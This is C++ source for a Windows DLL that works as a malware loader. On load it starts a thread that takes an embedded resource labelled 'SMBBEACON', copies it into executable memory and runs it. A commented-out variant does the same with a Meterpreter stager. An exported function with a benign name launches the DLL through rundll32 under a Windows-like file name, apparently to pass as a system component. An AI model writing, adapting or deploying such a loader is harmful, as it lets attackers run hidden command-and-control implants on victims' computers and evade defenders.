#define WIN32_LEAN_AND_MEAN
#include "pch.h"
#include <Windows.h>
#include <iostream>
#include "resource.h"
#include <strsafe.h>
#include <TlHelp32.h>

#define BUFSIZE 1024



HRESULT __stdcall QueryDeviceInformation()
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(STARTUPINFO));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    si.cb = sizeof(STARTUPINFO);

    WCHAR cmdLine[BUFSIZE];
    ZeroMemory(cmdLine, BUFSIZE);
    StringCchCat(cmdLine, BUFSIZE, L"rundll32 windowscoredeviceinfo.dll,Load");

    CreateProcess(nullptr, cmdLine, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return S_OK;
}

/*
int CreateLink()
{
    // IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode
    // METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin
      
    //HINSTANCE hInstance = GetModuleHandle(L"STAGER");
    HMODULE hModule = GetModuleHandle(L"STAGER");

    HRSRC testStuff = FindResource(hModule, MAKEINTRESOURCE(IDR_STAGER1),L"STAGER");
    DWORD testSize = SizeofResource(hModule, testStuff);
    HGLOBAL testResourceData = LoadResource(hModule, testStuff);
    LPVOID lpBin = LockResource(testResourceData);

    void* exec = VirtualAlloc(0, testSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, lpBin, testSize);
    ((void(*)())exec)();

    return  0;

}
/**/

static DWORD WINAPI launcher(void* h)
{

    //The following code block loads an Assembly from memory, using a payload embedded as a Resource

    //Aquire the payload from a resource
    HRSRC res = ::FindResourceA(static_cast<HMODULE>(h),
        MAKEINTRESOURCEA(IDR_SMBBEACON1), "SMBBEACON");

    if (res)
    {

        HGLOBAL dat = ::LoadResource(static_cast<HMODULE>(h), res);
        if (dat)
        {
            unsigned char* dll =
                static_cast<unsigned char*>(::LockResource(dat));
            if (dll)
            {
                size_t len = SizeofResource(static_cast<HMODULE>(h), res);

                void* exec = VirtualAlloc(0, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                memcpy(exec, dat, len);
                ((void(*)())exec)();
                
                //Update this with the correct fully-qualified class name and method name
                //Optionally pass in arguments.
                //LaunchDll(dll, len, "DemoAssemblyDLL.Demo", "Test", 0, nullptr);

                //const char* params[] = { "argument" };

                //Use to pass in arguments
                //LaunchDll(dll, len, "DemoAssemblyDLL.Demo", "Test", 1, params);

                //Use this instead if the payload is an EXE.
                //LaunchEXE(dll, len);
            }
        }
    }

    //Since we are outside of Loader Lock, we can also directly call into managed code.
    //Example_Managed_CallNative();

    return 0;
};

HANDLE hProjThread;
DWORD threadID;

/*
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
            break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
/**/


extern "C" BOOL APIENTRY DllMain(HMODULE h, DWORD reasonForCall, void* resv)
{
    if (reasonForCall == DLL_PROCESS_ATTACH)
    {
        //Create a new thread from our proxy native function to avoid Loader Lock
        hProjThread = CreateThread(0, 0, launcher, h, 0, &threadID);
    }
    return TRUE;
}


extern"C" __declspec(dllexport) BOOL Load(LPVOID lpUserdata, DWORD nUserdataLen) {

    if (hProjThread) {
        WaitForSingleObject(hProjThread, INFINITE);
    }

    return TRUE;
};